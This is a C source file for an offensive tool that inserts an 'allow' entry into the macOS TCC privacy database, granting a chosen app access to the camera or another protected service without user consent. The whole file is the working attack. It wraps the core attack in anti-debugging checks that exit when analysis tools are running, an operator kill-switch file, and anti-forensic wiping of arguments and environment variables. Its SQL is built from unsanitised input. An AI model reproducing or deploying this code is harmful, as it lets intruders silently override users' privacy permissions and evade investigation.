/*
 * tcc_allowlist_bypass.c (final enhanced)
 *

 * Bypasses macOS TCC by inserting an “allow” entry for a specified bundle ID and service.
 * Usage (as root, SIP disabled):
 *   sudo ./tcc_allowlist_bypass <service> <bundle_id>
 * Example:
 *   sudo ./tcc_allowlist_bypass kTCCServiceCamera com.apple.Terminal
 *
 * Compile on macOS:
 *   clang tcc_allowlist_bypass.c -o tcc_allowlist_bypass -framework CoreFoundation -framework Security -lsqlite3
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sqlite3.h>


#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

// --- Anti-debugging: exit if under analysis ---
static int is_debugger_present() {
    char buf[256];
    FILE *fp = popen("ps aux", "r");
    if (!fp) return 0;
    while (fgets(buf, sizeof(buf), fp)) {
        if (strstr(buf, "lldb") || strstr(buf, "gdb") || strstr(buf, "dtruss") || strstr(buf, "Instruments") || strstr(buf, "fs_usage")) {
            pclose(fp);
            return 1;
        }
    }
    pclose(fp);
    return 0;
}

// --- Operator kill switch (magic file) ---
static int check_kill_switch() {
    const char *home = getenv("HOME");
    char path[512];
    if (!home) return 0;
    snprintf(path, sizeof(path), "%s/.bismillah_kill", home);
    struct stat st;
    return stat(path, &st) == 0;
}

// --- Securely zero memory ---
static void secure_zero(void *p, size_t n) {
    volatile unsigned char *vp = (volatile unsigned char *)p;
    while (n--) *vp++ = 0;
}

int main(int argc, char* argv[])
{
    if (is_debugger_present()) return 0;
    if (check_kill_switch()) return 0;

    if (argc != 3) {
        fprintf(stderr, "Usage: %s <service> <bundle_id>\n", argv[0]);
        return 1;
    }
    const char *service = argv[1];
    const char *bundle = argv[2];
    const char *db_path = "/Library/Application Support/com.apple.TCC/Tcc.db";
    sqlite3 *db;
    char *err = NULL;
    int rc;

    /* Open TCC database */
    rc = sqlite3_open(db_path, &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "[-] Cannot open TCC DB at %s: %s\n", db_path, sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }

    /* Check schema for 'access' table */
    const char *schema_sql = "PRAGMA table_info(access);";
    rc = sqlite3_exec(db, schema_sql, NULL, 0, &err);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "[-] Schema check failed: %s\n", err);
        sqlite3_free(err);
        sqlite3_close(db);
        return 1;
    }

    /* Build SQL statement */
    time_t now = time(NULL);
    char sql[1024];
    snprintf(sql, sizeof(sql),
             "INSERT OR REPLACE INTO access "
             "(service, client, client_type, allowed, prompt_count, csreq, policy_id, policy_subject, "
             "flags, last_modified) VALUES "
             "('%s','%s',0,1,1,NULL,NULL,NULL,0,%ld);",
             service, bundle, now);

    /* Execute */
    rc = sqlite3_exec(db, sql, NULL, 0, &err);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "[-] SQL error: %s\n", err);
        sqlite3_free(err);
        sqlite3_close(db);
        return 1;
    }

    sqlite3_close(db);
    printf("[+] TCC DB modified: '%s' now allowed to use %s\n", bundle, service);

    // --- Anti-forensics: wipe argv and envp ---
    for (int i = 0; i < argc; ++i) secure_zero(argv[i], strlen(argv[i]));
    extern char **environ;
    for (char **e = environ; *e; ++e) secure_zero(*e, strlen(*e));
    return 0;
}
